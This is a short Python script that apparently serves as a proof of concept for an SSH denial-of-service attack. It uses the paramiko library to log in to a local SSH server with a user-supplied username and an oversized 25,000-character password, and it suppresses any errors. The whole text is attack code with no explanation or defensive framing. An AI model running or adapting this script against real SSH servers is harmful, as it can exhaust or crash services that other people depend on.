import paramiko
user=input("user: ")
p='A'*25000
ssh = paramiko.SSHClient()
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
try:
        ssh.connect('127.0.0.1', username=user,
        password=p)
except:
    pass